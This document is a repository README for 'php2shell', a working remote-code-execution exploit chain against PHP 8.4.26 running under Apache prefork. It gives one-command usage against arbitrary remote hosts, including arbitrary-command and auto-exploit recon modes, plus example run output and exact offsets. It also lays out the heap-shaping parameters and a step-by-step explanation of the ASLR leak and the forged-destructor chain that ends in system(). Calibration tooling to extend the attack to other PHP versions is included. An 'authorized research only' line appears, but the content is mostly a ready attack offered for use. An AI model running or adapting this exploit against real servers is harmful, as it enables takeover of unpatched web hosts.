# php2shell - Official environment, no `display_errors` needed, `memory_limit` untouched

[中文](README.md) | English

**Single-worker prefork.** In a fully remote, HTTP-only setting, with only
`<?php echo "OK\n"; ?>` on the target page and no PHP written on the target
side, one command reaches RCE:

- stock official image + official ini: **5/5**
- the same official build with symbols (gdb used only for offline
  calibration, never on the delivery path): **15/15**
- about 2 seconds per run, the worker is not restarted, the target ini is
  left untouched

# General exploitation

In principle, once you compute the offsets for every PHP version and fuzz
with them in bulk, one of those fuzz runs will eventually reach RCE.
Besides, a crashed worker restarts anyway, so there is no fear of knocking
the target offline.

As for workers: a single worker does not affect whether the exploit works,
only the success rate. In the test environment we temporarily use a single
worker to show it off; the full official worker setup will be released
later.

## Quick start (official php.ini-production / display_errors=Off / 128M)

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) Start the target: stock official image; the container only copies the
#    official php.ini-production to php.ini.
./pure/run_pure.sh
# target: OK
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M

# 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
python3 exploit.py --port 18110
# [try 1] A1: END-cleanup send_cookie OOM
# [try 1] B1: stale-id OOB read (chunk base + libphp)
#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No PHP/Apache build, no image build, no gdb, no ini changes.
`pure/run_pure.sh` uses container `p2s-pure-18110` on port `18110` by
default and prints the effective `display_errors` / `memory_limit` /
`post_max_size` values. On Linux without docker-group access it falls back
to `sudo docker`; you can also force `DOCKER="sudo docker" ./pure/run_pure.sh`.
`--dbg` only switches to the symbolic build of the same official version
for offline calibration.

Common options:

```bash
# Re-test with fresh ASLR (restart the container)
python3 exploit.py --port 18110 --restart p2s-pure-18110

# Arbitrary command: write a script into the mounted directory, then run sh
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

## Safe pre-flight and one-command exploitation
(`recon` subcommand)

The `recon` subcommand first probes passively plus
one ordinary small POST (with `Content-Length`,
~100B, far below `post_max_size`) to check the gate
A1 needs (`session.upload_progress.enabled`) and
whether the version/build matches -- **no chunked
traffic, no heap shaping, no OOM**. With
`--exploit`, a detected version that has an
RCE-verified profile runs the whole chain with
that profile's offsets and stage params -- one
command:

```bash
# local target
python3 exploit.py recon --port 18110
# remote target: IP, hostname, or full URL
# (scheme/path stripped)
python3 exploit.py recon --host 192.0.2.10 --port 80
python3 exploit.py recon --host https://example.com --port 80

# container introspection (ini / MPM / SAPI need
# docker exec)
python3 exploit.py recon --port 18110 --container p2s-pure-18110

# one-command exploitation:
# detect version -> select profile -> A1 -> B1 -> A2 -> B2
python3 exploit.py recon --host https://TARGET --port 443 --exploit
#   PHP 8.4.26: profile php-8.4.26-trixie-amd64 -
#                 RCE-verified calibration
#   exploit: using profile php-8.4.26-trixie-amd64
#   [try 1] A1: ...
#   [4/4] RCE OK; proof .../out/p1: uid=33(www-data) ...

# custom command
python3 exploit.py recon --host TARGET --exploit \
    --cmd 'sh</out/c'
```

`--exploit` safety boundary: only `rce_verified=true`
profiles (currently just 8.4.26) run; other
versions (symbols calibrated but heap layout not)
are refused with a clear reason. `--force`
overrides the refusal (loud WARNING, then runs
with 8.4.26 placeholder S/hsv and stage params --
expected to fail or crash the worker). `--retries`
defaults to 3. If the most common pointer in an
OOB window is not `zval_ptr_dtor`, the plausible
`libphp-main` delta check rejects that leak and
reruns the whole chain.

### Calibrating another version (`tools/calibrate.py`)

Symbol offsets (`zif_system`, `zval_ptr_dtor`) are
scraped offline per build; the heap-layout fields
(`S`, `hsv`, stage params) need a lab container of
the exact build. `tools/calibrate.py` runs the chain
in a local **podman** (or docker) container, sweeps
`S`/`hsv`, and writes a `rce_verified=true` profile
on success:

```bash
python3 tools/calibrate.py --tag 8.4.26-apache
# -> profiles/php-8.4.26-...json (rce_verified=true)
```

**Prerequisite: the build's A1 OOM must be
contained.** PHP 8.5.x changed the OOM path --
the heap corrupts (`zend_mm_heap corrupted`) and
the worker aborts (signal 6) before B1's stale-id
read, so the A1->B1 chain cannot reach a leak on
8.5.x with the current primitive. Calibration on
8.5.x therefore fails (cleanly, with the reason);
it needs a sub-OOM heap-shaping variant first.
PHP 8.4.26 (and earlier 8.4) is the verified
target.

## The pure-HTTP chain

The target page is only `<?php echo "OK\n"; ?>`; the attack traffic is
chunked multipart plus ordinary GET/POST:

1. **Chunked bypass of `post_max_size`**: without `Content-Length`,
   `content_length=0`, so the check at the top of
   `rfc1867_post_handler` is skipped; bodies far larger than 8M can be
   used for heap shaping.
2. **A1**: 860 depth-64 nested file fields + fillers + large values + a
   4000B `PHP_SESSION_UPLOAD_PROGRESS`, causing an OOM inside
   `php_url_encode` during END cleanup. The bailout leaves dangling
   `PS(id)` / `PS(mod_data)` and `send_cookie=1`.
3. **B1 (OOB read)**: after a safe close, `PS(id)` points at a forged
   `zend_string` header (len=0xC8000, data containing `/`), and
   `Set-Cookie` encodes 800KB of memory starting at the id chunk. The
   window contains:
   - 2MiB-aligned chunk pointer clusters -> id chunk / main chunk base;
   - the hole left by `G:400` at the tail of the id chunk is filled by
     900 nested-array fields; the real HashTables' `pDestructor =
     zval_ptr_dtor` appears 1095 times -> `libphp = value - 0x65EB60`.
4. **A2 + B2**: cheap-OOM points `PS(hash_serialize_verifier)` into the
   heap (`main+0x7D720`); B2 overwrites it with a 384B reference value
   that points at a zval at `S=main+0xF8398`. The fake zend_array at S
   has `pDestructor = zif_system` (`libphp+0x465370`); during shutdown
   `zend_hash_destroy` calls `system("id>/out/p1")`.

Offsets (this build, ASLR-independent):

| Symbol/location | Value |
|---|---|
| `zval_ptr_dtor` | `libphp+0x65EB60` |
| `zif_system` | `libphp+0x465370` |
| fake array `S` | `main+0xF8398` |
| A2 `hsv` | `main+0x7D720` |

Target environment: Debian 13 (trixie), Apache 2.4.69
prefork, PHP 8.4.26 NTS mod_php, files session handler.
ASLR changes per container start; the chain's two leaks
derive it at runtime. A different PHP build/version
needs calibration -- see the next section.

## Multi-version calibration (profiles/ directory)

Offsets are **per-build** (e.g. `zif_system` is
`libphp+0x465370` on 8.4.26 but `libphp+0x5996e0`
on 8.5.11), so each chain needs a profile:

```bash
# 1) Offline calibration: pull libphp.so straight
#    from the Docker Registry and parse its ELF
#    symtab (~20s/version, no docker daemon needed)
python3 tools/registry_scrape.py --tag 8.5.11-apache --write
#    -> profiles/php-8.5.11-trixie-amd64.json
#       (rce_verified=false: symbol offsets only;
#        S/hsv/stage params are still 8.4.26
#        placeholders)

# 2) Full calibration when you have a container
#    (also writes the profile):
python3 docker/offsets.py p2s-pure-18110
#    -> out/offsets.env + profiles/php-<ver>-calibrated-amd64.json

# 3) recon auto-selects a profile by detected
#    PHP version
python3 exploit.py recon --host TARGET --port 80
#    PHP 8.5.11: profile php-8.5.11-trixie-amd64 -
#                  catalog row, NOT RCE-verified yet
```

`profiles/php-8.4.26-trixie-amd64.json` is the
only `rce_verified=true` row (the 5/5 + 15/15 runs
above). The other rows (8.1.34 / 8.2.34 / 8.3.35 /
8.4.25 / 8.5.11) are symbol-calibrated only:
`zif_system` / `zval_ptr_dtor` come from the
official image's ELF, but `S=main+0xF8398`,
`hsv=main+0x7D720` and the A1/A2/B1/B2
heap-shaping parameters (`--big 78`, `--parts 880
--depth 64 --fillers 115`, `--vl 384 --n1 500
--n2 495`, `LEAK_SPEC`) depend on that build's heap
layout and **must be re-calibrated in a real
container before exploitation** (method in
pure/RESEARCH_PURE_128M.md §3/§6).

## Vulnerability context (CVE-2026-109618 / CVE-2026-109619)

The primitive class implemented here matches
**PHP2Shell** (CVE-2026-109618 / CVE-2026-109619,
CVSS 9.2), disclosed 2026-10-21: session /
upload-progress state left dangling on PHP's own OOM
`longjmp()` path -> heap OOB read -> forged
`pDestructor` RCE. Fixed versions:

| Branch | First fixed |
|---|---|
| 8.2 | 8.2.35 |
| 8.3 | 8.3.36 |
| 8.4 | 8.4.27 |
| 8.5 | 8.5.12 |

This repo's target (8.4.26) is the last affected 8.4
release. For authorized vulnerability research and
reproduction only; if you find an unpatched target,
report it to the owner and upgrade to the versions
above.

## Evidence

- Mechanism and calibration: [pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- Full-chain script: [exploit.py](exploit.py) (`pure/pwn_pure.py` remains as an alias)
- Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## Legacy (not the target)

The early `exploit.py` used a **custom** `docker/php.ini`
(`display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`). It is
unrelated to the official-config target above and is archived at
[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py); the docs in
the same directory, such as
[HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md) and
[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md), describe that
line.

## Reproduction statement

- The target configuration is the official `php.ini-production`
  (`display_errors=Off`, `memory_limit=128M`): no custom ini, no
  `display_errors=On` dependency, no target-side files, no
  `session_start()`, and no gdb on the delivery path.
- For vulnerability research and reproduction in authorized environments
  only.
